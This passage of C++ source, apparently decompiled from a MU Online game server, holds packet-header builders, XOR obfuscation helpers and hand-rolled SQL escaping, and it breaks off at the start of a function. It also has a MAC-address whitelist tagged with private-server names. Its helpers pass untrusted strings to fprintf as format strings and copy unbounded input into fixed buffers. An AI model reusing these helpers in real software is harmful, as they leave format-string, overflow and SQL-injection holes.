// ------------------------------
// Decompiled by Deathway
// Date : 2007-03-09
// ------------------------------
// WinUtil.cpp
//	GS-N	1.00.18	JPN	0x004A4E40	-	Completed

#include "stdafx.h"
#include "../Source/GameMain.h"
#include "../Source/DSProtocol.h"
#include "..\SOURCE\StdAfx.h"
#if (MAC_PROTECT==1)
#include "../Source/Extra/Firewall.h"
#endif
#include "winutil.h"
#include <Iphlpapi.h>
#include <Assert.h>
#pragma comment(lib, "iphlpapi.lib")
#include <rpc.h>
#include <rpcdce.h>
#pragma comment(lib, "rpcrt4.lib")

#if (WL_PROTECT==1)
#include "../Source/curl/curl.h"
#define CLIENTSNUMBER 118
#endif



static unsigned char bBuxCode[3]={0xFC, 0xCF, 0xAB};	// Xox Key for some interesthing things :)
static unsigned char bBuxCode2[3]={0x81, 0xDE, 0xE1};	// Xox Key for some interesthing things :)

int roundInt(int d) 
{ 
	return (d > 0.0) ? floor(d + 0.5) : ceil(d - 0.5); 
	//return floor(d + 0.5); 
}

double roundDbl(double d) 
{ 
	return (d > 0.0) ? floor(d + 0.5) : ceil(d - 0.5); 
}

void ToHexSinComa(char * out, char * data, int c_len)
{
	char cBuff[5001];
	c_len = c_len & 0xff;
	memset(cBuff, 0, 5000);
	for(int i=0;i<c_len;i++)
	{
		wsprintf(cBuff+(i*2),"%02X",data[i]);
//		s=cBuff;
//		t+=s;
	}
	memcpy(out,cBuff,(c_len*3)+2);
}

void BuxConvert(char* buf, int size)
{
	int n;

	for (n=0;n<size;n++)
	{
		buf[n]^=bBuxCode[n%3] ;		// Nice trick from WebZen
	}
}
void BuxConvert2(char* buf, int size)
{
	int n;

	for (n=0;n<size;n++)
	{
		buf[n]^=bBuxCode2[n%3] ;		// Nice trick from WebZen
	}
}
BOOL StringReplace(char * str,int maxSize,char Replace,char ReplaceTo)
{
	int i=0;
	BOOL isReplaced = FALSE;

	while(true)
	{
		if(str[i] == 0x00)
		{
			break;
		}
		if(i == maxSize)
		{
			break;
		}
		else if(str[i] == Replace)
		{
			str[i] = ReplaceTo;
			isReplaced = TRUE;
		}
		i++;
	}
	return isReplaced;
}


BOOL SQLSyntexCheck(char* SQLString)
{
	char* temp;

	temp=strchr(SQLString, 39);
	if (temp==0)
	{
		temp=strchr(SQLString, 32);
		if (temp==0)
		{
			return true;
		}
		else
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}
}

BOOL SQLSyntexCheckConvert(char* SQLString)
{
	char tempSQL[256];
	char* temp;
	char* temp2;

	temp2 = SQLString;
	int lOfs=0;
	int tOfs=0;
	int sOfs=0;

	

	if (SQLString==0)
	{
		return FALSE;
	}
	while (true)
	{
		temp = strchr(temp2, 39);
		if (temp != 0 )
		{
			if (temp - temp2 != 0)
			{
				memcpy(&tempSQL[tOfs], temp2, temp-temp2);
			}
			lOfs = temp - (temp2 + sOfs);
			tOfs += lOfs;
			temp2 += lOfs;

			tempSQL[tOfs]=0;

			tOfs += 2;
			temp2++;

			strcat(tempSQL, "''");
			
		}
		else
		{
			strcpy(&tempSQL[tOfs], temp2);
			break;
		}
	}

	
	strcpy(SQLString, tempSQL);		// Strange unseless jump here
	return true;
}


BOOL SpaceSyntexCheck(char* string)
{
	char* temp;
	
	temp = strchr(string, 32);
	if (temp ==0 )
	{
		return true;
	}
	else
	{
		return FALSE;
	}
}


BOOL StrHangulCheck(char* str)
{
	BYTE code1;
	BYTE code2;
	BYTE code;
	int i = 0;
	int n = 0;
	char	szTemp[256] = "";
	int result = 1;
	int count = 0xFF;	// -1


	while ((count--) != 0)
	{
	
		code1=str[i];
		i++;

		if (code1==0)
		{
			break;
		}
		else
		{
			if (code1<128)
			{
				szTemp[n]=code1;
				n++;
				continue;
			}
			else
			{
				code2=str[i];
				i++;
				code=code2 | (code1<<8);

				if ((code)>0)
				{
					szTemp[n]=code1;
					n++;
					szTemp[n]=code2;
					n++;
				}
				else
				{
					result =0;
				}
				if(code2==0)
				{
					break;
				}
			}
		}
	}
	
	
	strcpy(str, szTemp);
	return true;
}


void FileSaveString(char* filename, char* string)
{
	__try
	{
	FILE* fp;
	
	fp=fopen(filename, "at");

	if (fp==0)
	{
		return;
	}
	else
	{
		fprintf(fp, string);
		fprintf(fp, "\n");
		fclose(fp);
	}
	}__except( EXCEPTION_ACCESS_VIOLATION == GetExceptionCode() )
	{
	}
}






BOOL IsFile(char* filename)
{
FILE *fp;
	
	fp=fopen(filename,"rb");
	if (fp==0)
	{
		return FALSE;
	}
	else
	{
		fclose(fp);
		return true;
	}
}


void GetTodayString(char* szDate)
{
	tm* today;
	time_t ltime;
	

	time(&ltime);
	today=localtime(&ltime);

	today->tm_year = today->tm_year +1900;

	wsprintf(szDate, "%02d%02d%02d", today->tm_year , today->tm_mon +1 , today->tm_mday );
}


void PHeadSetB(LPBYTE lpBuf, BYTE head, int size)
{
	lpBuf[0] =0xC1;		// Packets
	lpBuf[1] =size;
	lpBuf[2] =head;
}
	

void PHeadSubSetB(LPBYTE lpBuf, BYTE head, BYTE sub, int size)
{
	lpBuf[0] =0xC1;	// Packets
	lpBuf[1] =size;
	lpBuf[2] =head;
	lpBuf[3] =sub;
}

void PHeadSetW(LPBYTE lpBuf, BYTE head,  int size) 
{
	lpBuf[0] = 0xC2;	// Packets Header
	lpBuf[1]= SET_NUMBERH(size);
	lpBuf[2]= SET_NUMBERL(size);
	lpBuf[3]= head;
}

void PHeadSubSetW(LPBYTE lpBuf, BYTE head, BYTE sub,  int size)
{
	lpBuf[0]=0xC2;	// packet header
	lpBuf[1]=SET_NUMBERH(size);
	lpBuf[2]=SET_NUMBERL(size);
	lpBuf[3]=head;
	lpBuf[4]=sub;
}


void PHeadSetBE( LPBYTE lpBuf, BYTE head,int size)
{
	lpBuf[0] =0xC3;
	lpBuf[1] =size;
	lpBuf[2] =head;
}

void PHeadSubSetBE(LPBYTE lpBuf, BYTE head,BYTE sub, int size)
{
	lpBuf[0] =0xC3;
	lpBuf[1] =size;
	lpBuf[2] =head;
	lpBuf[3] =sub;
}

int RandomNum(int Start, int End, bool UseSRand)
{
	if(UseSRand == true)
		srand(time(NULL));
	
	return rand()%End+Start;
}


#if (WL_PROTECT==1)

#if (MAC_PROTECT_OLD==1)

char SCFClientMAC[100];
int		MacAdressesCount				=	0;
LPCSTR	MacPart[255]					=	{0};

char ClientMacs[CLIENTSNUMBER][18] = 
{
		"36-00-92-1A-CF-A1", // {00-1A-92-36-A1-CF - 25 - [Paffka]        
    	"82-00-A1-08-4F-FC", // {00-08-A1-82-FC-4F - 1 - [OverMu 3]        
    	"D3-00-48-30-BF-49", // {00-30-48-D3-49-BF - 18 - [Flare Online]        
    	"37-00-17-15-4A-36", // {00-15-17-37-36-4A - 60 - [Zhen1]        
    	"75-00-C0-1C-4C-C2", // {00-1C-C0-75-C2-4C - 60 - [zhen2]        
    	"06-00-C0-1C-49-D1", // {00-1C-C0-06-D1-49 - 2 - [MuOnline.Lv]        
    	"A1-00-D1-19-00-00", // {00-19-D1-A1-00-00 - 2 - [mu.dream.lv]        
    	"C3-00-48-30-37-36", // {00-30-48-C3-36-37 - 71 - [HMXtreme]        
    	"C0-00-56-50-08-00", // {00-50-56-C0-00-08 - 133 - [aldinfo_Eua]        
    	"25-00-1D-24-DC-1D", // {00-24-1D-25-1D-DC - 7 - [Home-Phenom]        
    	"6D-00-4F-06-35-03", // {00-06-4F-6D-03-35 - 153 - [MuratiGames]        
    	"C0-00-56-50-08-00", // {00-50-56-C0-00-08 - 133 - [aldinfo_br]        
    	"5F-00-4D-1A-7D-0C", // {00-1A-4D-5F-0C-7D - 76 - [GLOWNY]        
    	"48-00-4D-1A-E5-A2", // {00-1A-4D-48-A2-E5 - 76 - [PODSERVER]        
    	"10-00-F3-18-DC-85", // {00-18-F3-10-85-DC - 28 - [SonicM_S1]        
    	"E2-00-92-1A-A9-67", // {00-1A-92-E2-67-A9 - 28 - [SonicM_S2]        
    	"D0-00-D0-1F-01-F7", // {00-1F-D0-D0-F7-01 - 28 - [SonicM_PC]        
    	"0F-00-E0-19-4E-2D", // {00-19-E0-0F-2D-4E - 125 - [Ascension MU]        
    	"2D-00-19-22-7E-65", // {00-22-19-2D-65-7E - 5 - [Mu-V2]        
    	"E4-00-2E-0E-9E-6E", // {00-0E-2E-E4-6E-9E - 4 - [Avantasia]        
    	"47-00-C0-1C-5F-EB", // {00-1C-C0-47-EB-5F - 75 - [vcorp1]        
    	"A0-00-58-1E-0A-34", // {00-1E-58-A0-34-0A - 5 - [ChileMU]        
    	"52-00-4F-06-5B-1C", // {00-06-4F-52-1C-5B - 32 - [MuPy]        
    	"B6-00-C6-1F-FE-D6", // {00-1F-C6-B6-D6-FE - 106 - [LoiS]        
    	"63-00-FC-1B-A7-FE", // {00-1B-FC-63-FE-A7 - 32 - [MuPyTess]        
    	"2C-00-60-1D-5E-24", // {00-1D-60-2C-24-5E - 47 - [SunEmpire]        
    	"91-00-48-30-F7-2E", // {00-30-48-91-2E-F7 - 143 - [TwilightMU]        
    	"55-00-66-19-88-17", // {00-19-66-55-17-88 - 141 - [Mu Sharingan]        
    	"B8-00-C0-1C-D9-AC", // {00-1C-C0-B8-AC-D9 - 116 - [kaxcito1]        
    	"D5-00-97-21-D1-A9", // {00-21-97-D5-A9-D1 - 116 - [kaxcito2]        
    	"A3-00-44-02-1E-12", // {00-02-44-A3-12-1E - 110 - [5h1z1k1]        
    	"87-00-D0-1F-D5-E6", // {00-1F-D0-87-E6-D5 - 38 - [mulegend]        
    	"E8-00-2E-0E-2F-EA", // {00-0E-2E-E8-EA-2F - 74 - [PyroMu S5]        
    	"34-00-48-30-71-84", // {00-30-48-34-84-71 - 78 - [AncientMu]        
    	"D9-00-48-30-FB-6A", // {00-30-48-D9-6A-FB - 78 - [funzmu]        
    	"9B-00-48-30-59-8B", // {00-30-48-9B-8B-59 - 78 - [Silvermu]        
    	"34-00-64-22-2F-A3", // {00-22-64-34-A3-2F - 78 - [europaserver]        
    	"98-00-48-30-A3-A8", // {00-30-48-98-A8-A3 - 137 - [gamezeventos1]        
    	"F9-00-B9-19-15-E4", // {00-19-B9-F9-E4-15 - 26 - [MuZone-High]        
    	"C0-00-56-50-08-00", // {00-50-56-C0-00-08 - 98 - [mumaster1]        
    	"81-00-C0-1C-E7-D5", // {00-1C-C0-81-D5-E7 - 80 - [Dyego1]        
    	"26-00-17-15-93-B8", // {00-15-17-26-B8-93 - 98 - [mumaster2]        
    	"98-00-48-30-39-E6", // {00-30-48-98-E6-39 - 64 - [KCeres1]        
    	"E8-00-2E-0E-F7-E0", // {00-0E-2E-E8-E0-F7 - 137 - [FeareignMu]        
    	"17-00-CD-0A-87-8A", // {00-0A-CD-17-8A-87 - 109 - [MuBlade - Evolutions]        
    	"0F-00-63-21-67-C5", // {00-21-63-0F-C5-67 - 109 - [MuBlade - Test]        
    	"F8-00-29-0C-A8-0D", // {00-0C-29-F8-0D-A8 - 154 - [MU-TDB]        
    	"10-00-29-0C-79-4C", // {00-0C-29-10-4C-79 - 11 - [MuRN1]        
    	"3B-00-99-10-10-89", // {00-10-99-3B-89-10 - 155 - [cis3mu]        
    	"33-00-48-30-0F-BE", // {00-30-48-33-BE-0F - 20 - [MuTheMatrix]        
    	"DE-00-E6-16-B4-33", // {00-16-E6-DE-33-B4 - 107 - [KoZ Mu BG]        
    	"13-00-E0-19-DB-DC", // {00-19-E0-13-DC-DB - 107 - [KoZ Mu S4 MaX]        
    	"FF-00-4C-E0-05-D8", // {00-E0-4C-FF-D8-05 - 107 - [PVP KoZ Mu]        
    	"79-00-48-30-34-86", // {00-30-48-79-86-34 - 148 - [muserver.mulander.com]        
    	"95-00-8D-50-4C-52", // {00-50-8D-95-52-4C - 147 - [eGames Main]        
    	"DA-00-48-30-7D-31", // {00-30-48-DA-31-7D - 148 - [muserver2.mulander.com]        
    	"12-00-0A-16-2D-69", // {00-16-0A-12-69-2D - 147 - [eGames High]        
    	"29-00-7D-23-B6-B5", // {00-23-7D-29-B5-B6 - 102 - [ExtraMU]        
    	"3D-00-D1-19-54-6C", // {00-19-D1-3D-6C-54 - 22 - [siikaisz-e]        
    	"59-00-4D-E0-6A-47", // {00-E0-4D-59-47-6A - 22 - [siikaisz-t]        
    	"94-00-D0-1F-DA-4B", // {00-1F-D0-94-4B-DA - 22 - [siikaisz-m]        
    	"A7-00-D1-19-A1-53", // {00-19-D1-A7-53-A1 - 148 - [homeserver.mulander.com]        
    	"FA-00-B9-19-6A-5B", // {00-19-B9-FA-5B-6A - 90 - [MuRayum]        
    	"FA-00-B9-19-B1-53", // {00-19-B9-FA-53-B1 - 90 - [MuSmooth]        
    	"C0-00-56-50-08-00", // {00-50-56-C0-00-08 - 64 - [KCeres2]        
    	"8C-00-2F-11-4F-D5", // {00-11-2F-8C-D5-4F - 21 - [FinalEvo]        
    	"99-00-D3-13-08-D6", // {00-13-D3-99-D6-08 - 140 - [Andrey731]        
    	"8B-00-48-30-5B-57", // {00-30-48-8B-57-5B - 71 - [HMZero]        
    	"3C-00-D1-14-7C-07", // {00-14-D1-3C-07-7C - 137 - [gamezeventos2]        
    	"AE-00-D0-1F-54-36", // {00-1F-D0-AE-36-54 - 118 - [Rapichris@Net]        
    	"04-00-D0-1F-F7-A9", // {00-1F-D0-04-A9-F7 - 151 - [MU-LGO]        
    	"A1-00-C0-1C-18-DC", // {00-1C-C0-A1-DC-18 - 151 - [MU Omega]        
    	"92-00-21-19-B1-09", // {00-19-21-92-09-B1 - 59 - [Blast Mu]        
    	"54-00-1D-24-B8-A0", // {00-24-1D-54-A0-B8 - 143 - [LegendaryMU]        
    	"A3-00-18-30-17-50", // {00-30-18-A3-50-17 - 19 - [ArioS-Main]        
    	"AA-00-C7-08-FB-E4", // {00-08-C7-AA-E4-FB - 19 - [ArioS-Main2]        
    	"14-00-C0-1C-B9-C1", // {00-1C-C0-14-C1-B9 - 105 - [Tan Hop Nhat]        
    	"66-00-AC-04-86-77", // {00-04-AC-66-77-86 - 19 - [ArioS-Internal]        
    	"AB-00-C0-1C-00-F9", // {00-1C-C0-AB-F9-00 - 120 - [ALPHA]        
    	"C0-00-DA-50-6A-10", // {00-50-DA-C0-10-6A - 120 - [BETA]        
    	"9A-00-48-30-22-90", // {00-30-48-9A-90-22 - 97 - [MUDATVIET]        
    	"9A-00-48-30-F1-8F", // {00-30-48-9A-8F-F1 - 97 - [MUTHOIDAI]        
    	"DB-00-48-30-92-33", // {00-30-48-DB-33-92 - 97 - [MUSIEUVIET]        
    	"AB-00-C0-1C-12-F9", // {00-1C-C0-AB-F9-12 - 120 - [muomega]        
    	"B8-00-E9-15-01-C6", // {00-15-E9-B8-C6-01 - 134 - [Mu-Troia]        
    	"B6-00-92-1D-80-9D", // {00-1D-92-B6-9D-80 - 109 - [MuBlade - PRUEBAS]        
    	"A8-00-21-24-74-5D", // {00-24-21-A8-5D-74 - 101 - [x6games]        
    	"4E-00-92-1A-B5-36", // {00-1A-92-4E-36-B5 - 15 - [Mulandia Normal]        
    	"E2-00-E5-1E-A5-D3", // {00-1E-E5-E2-D3-A5 - 74 - [Sarti's Computer]        
    	"AC-00-C6-1F-FB-E8", // {00-1F-C6-AC-E8-FB - 101 - [HellSingMu]        
    	"33-00-E9-07-56-65", // {00-07-E9-33-65-56 - 17 - [MuQuebec]        
    	"32-00-48-30-3B-2B", // {00-30-48-32-2B-3B - 82 - [Z1-COM]        
    	"C0-00-48-30-A5-80", // {00-30-48-C0-80-A5 - 82 - [G1-COM]        
    	"C5-00-48-30-95-F6", // {00-30-48-C5-F6-95 - 82 - [F1-COM]        
    	"78-00-C0-1C-D6-6B", // {00-1C-C0-78-6B-D6 - 16 - [GMUTempest]        
    	"78-00-C0-1C-F3-6B", // {00-1C-C0-78-6B-F3 - 16 - [GMUPearl]        
    	"07-00-0C-0E-61-C0", // {00-0E-0C-07-C0-61 - 66 - [116]        
    	"07-00-0C-0E-A5-D3", // {00-0E-0C-07-D3-A5 - 66 - [117]        
    	"5C-00-48-30-D5-EF", // {00-30-48-5C-EF-D5 - 21 - [muita]        
    	"E7-00-C5-15-20-5D", // {00-15-C5-E7-5D-20 - 111 - [larky]        
    	"99-00-C0-1C-D7-E6", // {00-1C-C0-99-E6-D7 - 156 - [MUNEMESIS]        
    	"7D-00-48-30-61-F7", // {00-30-48-7D-F7-61 - 96 - [MuMexicoRS]        
    	"17-00-CD-0A-BA-88", // {00-0A-CD-17-88-BA - 96 - [MuMexicoLS]        
    	"D4-00-48-30-D7-10", // {00-30-48-D4-10-D7 - 99 - [Ares]        
    	"CA-00-60-1D-E1-FF", // {00-1D-60-CA-FF-E1 - 99 - [TITAN]        
    	"F3-00-C6-1F-68-97", // {00-1F-C6-F3-97-68 - 99 - [ZEUS]        
    	"18-00-CD-0A-7F-2E", // {00-0A-CD-18-2E-7F - 87 - [Peru MuOnline]        
    	"08-00-61-E0-D5-78", // {00-E0-61-08-78-D5 - 126 - [MuOnline Latino Fast Server]        
    	"8E-00-85-21-68-0E", // {00-21-85-8E-0E-68 - 94 - [FriendsMu]        
    	"EB-00-92-1D-AE-81", // {00-1D-92-EB-81-AE - 49 - [SpirytMu]        
    	"34-00-21-24-2D-AF", // {00-24-21-34-AF-2D - 15 - [MuOnline2]        
    	"8E-00-48-30-5F-96", // {00-30-48-8E-96-5F - 119 - [muyes_s4]        
    	"E7-00-2E-0E-97-6D", // {00-0E-2E-E7-6D-97 - 139 - [GraveyardMu]        
    	"00-00-B0-A1-B5-6C", // {00-A1-B0-00-6C-B5 - 26 - [MuZone Low]        
    	"C0-00-56-50-08-00", // {00-50-56-C0-00-08 - 149 - [subwaycl.com]        
    	"F1-00-C0-1C-9D-BA", // {00-1C-C0-F1-BA-9D - 113 - [MuOnline.es]        
    	"F1-00-C0-1C-9D-BA", // {00-1C-C0-F1-BA-9D - 113 - [MuOnline.es]        
    	"B7-00-C0-1C-65-32", // {00-1C-C0-B7-32-65 - 80 - [Dyego2]        
};

LPCSTR	Clients[CLIENTSNUMBER*6]		=	{
		"36","00","92","1A","CF","A1", // {00-1A-92-36-A1-CF - 25 - [Paffka]        
    	"82","00","A1","08","4F","FC", // {00-08-A1-82-FC-4F - 1 - [OverMu 3]        
    	"D3","00","48","30","BF","49", // {00-30-48-D3-49-BF - 18 - [Flare Online]        
    	"37","00","17","15","4A","36", // {00-15-17-37-36-4A - 60 - [Zhen1]        
    	"75","00","C0","1C","4C","C2", // {00-1C-C0-75-C2-4C - 60 - [zhen2]        
    	"06","00","C0","1C","49","D1", // {00-1C-C0-06-D1-49 - 2 - [MuOnline.Lv]        
    	"A1","00","D1","19","00","00", // {00-19-D1-A1-00-00 - 2 - [mu.dream.lv]        
    	"C3","00","48","30","37","36", // {00-30-48-C3-36-37 - 71 - [HMXtreme]        
    	"C0","00","56","50","08","00", // {00-50-56-C0-00-08 - 133 - [aldinfo_Eua]        
    	"25","00","1D","24","DC","1D", // {00-24-1D-25-1D-DC - 7 - [Home-Phenom]        
    	"6D","00","4F","06","35","03", // {00-06-4F-6D-03-35 - 153 - [MuratiGames]        
    	"C0","00","56","50","08","00", // {00-50-56-C0-00-08 - 133 - [aldinfo_br]        
    	"5F","00","4D","1A","7D","0C", // {00-1A-4D-5F-0C-7D - 76 - [GLOWNY]        
    	"48","00","4D","1A","E5","A2", // {00-1A-4D-48-A2-E5 - 76 - [PODSERVER]        
    	"10","00","F3","18","DC","85", // {00-18-F3-10-85-DC - 28 - [SonicM_S1]        
    	"E2","00","92","1A","A9","67", // {00-1A-92-E2-67-A9 - 28 - [SonicM_S2]        
    	"D0","00","D0","1F","01","F7", // {00-1F-D0-D0-F7-01 - 28 - [SonicM_PC]        
    	"0F","00","E0","19","4E","2D", // {00-19-E0-0F-2D-4E - 125 - [Ascension MU]        
    	"2D","00","19","22","7E","65", // {00-22-19-2D-65-7E - 5 - [Mu-V2]        
    	"E4","00","2E","0E","9E","6E", // {00-0E-2E-E4-6E-9E - 4 - [Avantasia]        
    	"47","00","C0","1C","5F","EB", // {00-1C-C0-47-EB-5F - 75 - [vcorp1]        
    	"A0","00","58","1E","0A","34", // {00-1E-58-A0-34-0A - 5 - [ChileMU]        
    	"52","00","4F","06","5B","1C", // {00-06-4F-52-1C-5B - 32 - [MuPy]        
    	"B6","00","C6","1F","FE","D6", // {00-1F-C6-B6-D6-FE - 106 - [LoiS]        
    	"63","00","FC","1B","A7","FE", // {00-1B-FC-63-FE-A7 - 32 - [MuPyTess]        
    	"2C","00","60","1D","5E","24", // {00-1D-60-2C-24-5E - 47 - [SunEmpire]        
    	"91","00","48","30","F7","2E", // {00-30-48-91-2E-F7 - 143 - [TwilightMU]        
    	"55","00","66","19","88","17", // {00-19-66-55-17-88 - 141 - [Mu Sharingan]        
    	"B8","00","C0","1C","D9","AC", // {00-1C-C0-B8-AC-D9 - 116 - [kaxcito1]        
    	"D5","00","97","21","D1","A9", // {00-21-97-D5-A9-D1 - 116 - [kaxcito2]        
    	"A3","00","44","02","1E","12", // {00-02-44-A3-12-1E - 110 - [5h1z1k1]        
    	"87","00","D0","1F","D5","E6", // {00-1F-D0-87-E6-D5 - 38 - [mulegend]        
    	"E8","00","2E","0E","2F","EA", // {00-0E-2E-E8-EA-2F - 74 - [PyroMu S5]        
    	"34","00","48","30","71","84", // {00-30-48-34-84-71 - 78 - [AncientMu]        
    	"D9","00","48","30","FB","6A", // {00-30-48-D9-6A-FB - 78 - [funzmu]        
    	"9B","00","48","30","59","8B", // {00-30-48-9B-8B-59 - 78 - [Silvermu]        
    	"34","00","64","22","2F","A3", // {00-22-64-34-A3-2F - 78 - [europaserver]        
    	"98","00","48","30","A3","A8", // {00-30-48-98-A8-A3 - 137 - [gamezeventos1]        
    	"F9","00","B9","19","15","E4", // {00-19-B9-F9-E4-15 - 26 - [MuZone-High]        
    	"C0","00","56","50","08","00", // {00-50-56-C0-00-08 - 98 - [mumaster1]        
    	"81","00","C0","1C","E7","D5", // {00-1C-C0-81-D5-E7 - 80 - [Dyego1]        
    	"26","00","17","15","93","B8", // {00-15-17-26-B8-93 - 98 - [mumaster2]        
    	"98","00","48","30","39","E6", // {00-30-48-98-E6-39 - 64 - [KCeres1]        
    	"E8","00","2E","0E","F7","E0", // {00-0E-2E-E8-E0-F7 - 137 - [FeareignMu]        
    	"17","00","CD","0A","87","8A", // {00-0A-CD-17-8A-87 - 109 - [MuBlade - Evolutions]        
    	"0F","00","63","21","67","C5", // {00-21-63-0F-C5-67 - 109 - [MuBlade - Test]        
    	"F8","00","29","0C","A8","0D", // {00-0C-29-F8-0D-A8 - 154 - [MU-TDB]        
    	"10","00","29","0C","79","4C", // {00-0C-29-10-4C-79 - 11 - [MuRN1]        
    	"3B","00","99","10","10","89", // {00-10-99-3B-89-10 - 155 - [cis3mu]        
    	"33","00","48","30","0F","BE", // {00-30-48-33-BE-0F - 20 - [MuTheMatrix]        
    	"DE","00","E6","16","B4","33", // {00-16-E6-DE-33-B4 - 107 - [KoZ Mu BG]        
    	"13","00","E0","19","DB","DC", // {00-19-E0-13-DC-DB - 107 - [KoZ Mu S4 MaX]        
    	"FF","00","4C","E0","05","D8", // {00-E0-4C-FF-D8-05 - 107 - [PVP KoZ Mu]        
    	"79","00","48","30","34","86", // {00-30-48-79-86-34 - 148 - [muserver.mulander.com]        
    	"95","00","8D","50","4C","52", // {00-50-8D-95-52-4C - 147 - [eGames Main]        
    	"DA","00","48","30","7D","31", // {00-30-48-DA-31-7D - 148 - [muserver2.mulander.com]        
    	"12","00","0A","16","2D","69", // {00-16-0A-12-69-2D - 147 - [eGames High]        
    	"29","00","7D","23","B6","B5", // {00-23-7D-29-B5-B6 - 102 - [ExtraMU]        
    	"3D","00","D1","19","54","6C", // {00-19-D1-3D-6C-54 - 22 - [siikaisz-e]        
    	"59","00","4D","E0","6A","47", // {00-E0-4D-59-47-6A - 22 - [siikaisz-t]        
    	"94","00","D0","1F","DA","4B", // {00-1F-D0-94-4B-DA - 22 - [siikaisz-m]        
    	"A7","00","D1","19","A1","53", // {00-19-D1-A7-53-A1 - 148 - [homeserver.mulander.com]        
    	"FA","00","B9","19","6A","5B", // {00-19-B9-FA-5B-6A - 90 - [MuRayum]        
    	"FA","00","B9","19","B1","53", // {00-19-B9-FA-53-B1 - 90 - [MuSmooth]        
    	"C0","00","56","50","08","00", // {00-50-56-C0-00-08 - 64 - [KCeres2]        
    	"8C","00","2F","11","4F","D5", // {00-11-2F-8C-D5-4F - 21 - [FinalEvo]        
    	"99","00","D3","13","08","D6", // {00-13-D3-99-D6-08 - 140 - [Andrey731]        
    	"8B","00","48","30","5B","57", // {00-30-48-8B-57-5B - 71 - [HMZero]        
    	"3C","00","D1","14","7C","07", // {00-14-D1-3C-07-7C - 137 - [gamezeventos2]        
    	"AE","00","D0","1F","54","36", // {00-1F-D0-AE-36-54 - 118 - [Rapichris@Net]        
    	"04","00","D0","1F","F7","A9", // {00-1F-D0-04-A9-F7 - 151 - [MU-LGO]        
    	"A1","00","C0","1C","18","DC", // {00-1C-C0-A1-DC-18 - 151 - [MU Omega]        
    	"92","00","21","19","B1","09", // {00-19-21-92-09-B1 - 59 - [Blast Mu]        
    	"54","00","1D","24","B8","A0", // {00-24-1D-54-A0-B8 - 143 - [LegendaryMU]        
    	"A3","00","18","30","17","50", // {00-30-18-A3-50-17 - 19 - [ArioS-Main]        
    	"AA","00","C7","08","FB","E4", // {00-08-C7-AA-E4-FB - 19 - [ArioS-Main2]        
    	"14","00","C0","1C","B9","C1", // {00-1C-C0-14-C1-B9 - 105 - [Tan Hop Nhat]        
    	"66","00","AC","04","86","77", // {00-04-AC-66-77-86 - 19 - [ArioS-Internal]        
    	"AB","00","C0","1C","00","F9", // {00-1C-C0-AB-F9-00 - 120 - [ALPHA]        
    	"C0","00","DA","50","6A","10", // {00-50-DA-C0-10-6A - 120 - [BETA]        
    	"9A","00","48","30","22","90", // {00-30-48-9A-90-22 - 97 - [MUDATVIET]        
    	"9A","00","48","30","F1","8F", // {00-30-48-9A-8F-F1 - 97 - [MUTHOIDAI]        
    	"DB","00","48","30","92","33", // {00-30-48-DB-33-92 - 97 - [MUSIEUVIET]        
    	"AB","00","C0","1C","12","F9", // {00-1C-C0-AB-F9-12 - 120 - [muomega]        
    	"B8","00","E9","15","01","C6", // {00-15-E9-B8-C6-01 - 134 - [Mu-Troia]        
    	"B6","00","92","1D","80","9D", // {00-1D-92-B6-9D-80 - 109 - [MuBlade - PRUEBAS]        
    	"A8","00","21","24","74","5D", // {00-24-21-A8-5D-74 - 101 - [x6games]        
    	"4E","00","92","1A","B5","36", // {00-1A-92-4E-36-B5 - 15 - [Mulandia Normal]        
    	"E2","00","E5","1E","A5","D3", // {00-1E-E5-E2-D3-A5 - 74 - [Sarti's Computer]        
    	"AC","00","C6","1F","FB","E8", // {00-1F-C6-AC-E8-FB - 101 - [HellSingMu]        
    	"33","00","E9","07","56","65", // {00-07-E9-33-65-56 - 17 - [MuQuebec]        
    	"32","00","48","30","3B","2B", // {00-30-48-32-2B-3B - 82 - [Z1-COM]        
    	"C0","00","48","30","A5","80", // {00-30-48-C0-80-A5 - 82 - [G1-COM]        
    	"C5","00","48","30","95","F6", // {00-30-48-C5-F6-95 - 82 - [F1-COM]        
    	"78","00","C0","1C","D6","6B", // {00-1C-C0-78-6B-D6 - 16 - [GMUTempest]        
    	"78","00","C0","1C","F3","6B", // {00-1C-C0-78-6B-F3 - 16 - [GMUPearl]        
    	"07","00","0C","0E","61","C0", // {00-0E-0C-07-C0-61 - 66 - [116]        
    	"07","00","0C","0E","A5","D3", // {00-0E-0C-07-D3-A5 - 66 - [117]        
    	"5C","00","48","30","D5","EF", // {00-30-48-5C-EF-D5 - 21 - [muita]        
    	"E7","00","C5","15","20","5D", // {00-15-C5-E7-5D-20 - 111 - [larky]        
    	"99","00","C0","1C","D7","E6", // {00-1C-C0-99-E6-D7 - 156 - [MUNEMESIS]        
    	"7D","00","48","30","61","F7", // {00-30-48-7D-F7-61 - 96 - [MuMexicoRS]        
    	"17","00","CD","0A","BA","88", // {00-0A-CD-17-88-BA - 96 - [MuMexicoLS]        
    	"D4","00","48","30","D7","10", // {00-30-48-D4-10-D7 - 99 - [Ares]        
    	"CA","00","60","1D","E1","FF", // {00-1D-60-CA-FF-E1 - 99 - [TITAN]        
    	"F3","00","C6","1F","68","97", // {00-1F-C6-F3-97-68 - 99 - [ZEUS]        
    	"18","00","CD","0A","7F","2E", // {00-0A-CD-18-2E-7F - 87 - [Peru MuOnline]        
    	"08","00","61","E0","D5","78", // {00-E0-61-08-78-D5 - 126 - [MuOnline Latino Fast Server]        
    	"8E","00","85","21","68","0E", // {00-21-85-8E-0E-68 - 94 - [FriendsMu]        
    	"EB","00","92","1D","AE","81", // {00-1D-92-EB-81-AE - 49 - [SpirytMu]        
    	"34","00","21","24","2D","AF", // {00-24-21-34-AF-2D - 15 - [MuOnline2]        
    	"8E","00","48","30","5F","96", // {00-30-48-8E-96-5F - 119 - [muyes_s4]        
    	"E7","00","2E","0E","97","6D", // {00-0E-2E-E7-6D-97 - 139 - [GraveyardMu]        
    	"00","00","B0","A1","B5","6C", // {00-A1-B0-00-6C-B5 - 26 - [MuZone Low]        
    	"C0","00","56","50","08","00", // {00-50-56-C0-00-08 - 149 - [subwaycl.com]        
    	"F1","00","C0","1C","9D","BA", // {00-1C-C0-F1-BA-9D - 113 - [MuOnline.es]        
    	"F1","00","C0","1C","9D","BA", // {00-1C-C0-F1-BA-9D - 113 - [MuOnline.es]        
    	"B7","00","C0","1C","65","32", // {00-1C-C0-B7-32-65 - 80 - [Dyego2]        
		};


void CheckMemoryTeaser_MAC_Getter()
{
	CODEREPLACE_START

